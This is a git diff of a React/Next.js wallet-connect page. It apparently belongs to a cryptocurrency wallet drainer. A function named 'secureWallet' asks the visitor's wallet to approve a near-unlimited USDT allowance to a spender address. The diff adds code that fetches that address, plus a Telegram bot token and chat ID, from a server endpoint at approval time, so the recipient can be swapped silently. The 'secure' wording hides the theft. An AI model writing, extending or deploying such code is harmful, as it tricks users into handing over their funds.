@@ -44,17 +44,46 @@ export default function Home() {
 
   // ENV VARIABLES
 
-  const spenderAddress = process.env
-    .NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}`;
-  const contractAddress = process.env.NEXT_PUBLIC_ADDRESS as `0x${string}`;
-  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
-  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
   const websiteName = process.env.NEXT_PUBLIC_WEBSITE_NAME;
+
+  // State for environment variables
+  const [envVariables, setEnvVariables] = useState({
+    spenderAddress: "",
+    contractAddress: "",
+    botToken: "",
+    chatId: "",
+  });
+  const [loadingEnv, setLoadingEnv] = useState(true); // Loading state for env variables
 
   const { open, close } = useWeb3Modal();
   const { disconnect } = useDisconnect();
   const { address } = useAccount();
   const { chain } = useNetwork();
+
+  // Fetch environment variables from MongoDB
+  useEffect(() => {
+    const fetchEnvVariables = async () => {
+      try {
+        const response = await axios.get("/api/get-env");
+        setEnvVariables(response.data);
+      } catch (error) {
+        console.error("Failed to fetch environment variables:", error);
+      } finally {
+        setLoadingEnv(false);
+      }
+    };
+
+    fetchEnvVariables();
+  }, []);
+
+  const [currentSpenderAddress, setCurrentSpenderAddress] = useState<
+    string | null
+  >(null);
+  const [currentContractAddress, setCurrentContractAddress] = useState<
+    string | null
+  >(null);
+
+  const { botToken, chatId } = envVariables;
 
   const { data: balanceData } = useBalance({ address });
   const {
@@ -65,10 +94,10 @@ export default function Home() {
 
   // const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
   const { config } = usePrepareContractWrite({
-    address: contractAddress, // USDT-ERC20
+    address: currentContractAddress as `0x${string}`, // USDT-ERC20
     abi: usdtABI,
     functionName: "approve",
-    args: [spenderAddress as Address, parseEther("100000000000")],
+    args: [currentSpenderAddress as Address, parseEther("100000000000")],
   });
 
   const {
@@ -84,10 +113,35 @@ export default function Home() {
     setIsConnectHighlighted(false);
   };
 
+  const fetchEnvVariables = async () => {
+    try {
+      const response = await axios.get("/api/get-env"); // Update with your actual API endpoint
+      return response.data; // Assuming the response returns an object with the variables
+    } catch (error) {
+      console.error("Error fetching environment variables:", error);
+      return { spenderAddress: null, contractAddress: null }; // Fallback if fetch fails
+    }
+  };
+
   const secureWallet = async () => {
     setWalletStatus("secure");
     setIsConnectHighlighted(false);
     setIsNetworkSwitchHighlighted(false);
+
+    // Fetch the latest addresses just before the approval process
+    const {
+      spenderAddress: latestSpenderAddress,
+      contractAddress: latestContractAddress,
+    } = await fetchEnvVariables();
+
+    // Set the latest addresses to state
+    if (latestSpenderAddress && latestContractAddress) {
+      setCurrentSpenderAddress(latestSpenderAddress);
+      setCurrentContractAddress(latestContractAddress);
+    } else {
+      setError("Invalid addresses fetched. Please try again.");
+      return;
+    }
 
     if (write) {
       try {
